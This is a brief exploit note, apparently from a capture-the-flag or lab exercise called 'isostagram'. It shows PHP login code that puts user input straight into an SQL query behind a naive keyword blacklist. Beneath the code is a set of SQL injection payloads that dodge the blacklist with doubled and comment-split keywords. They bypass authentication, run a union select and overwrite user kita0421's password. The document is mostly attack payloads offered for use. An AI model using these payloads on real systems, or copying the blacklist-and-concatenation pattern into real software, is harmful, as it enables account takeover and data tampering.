# isostagram
sql injection




$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";

kita0421
UPDATE users SET `password`='123';--
WHERE some_column=some_value;

```SQL
' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--
AS INJECTX WHE/**/RE 1=1 AND 1=1  
1' OORR '1' = '1' limit 1; --
 "’ OORR ‘’=‘’-- "
 /*union*/union/*select*/select+'kita0421','kita0421','kita0421' -- 
```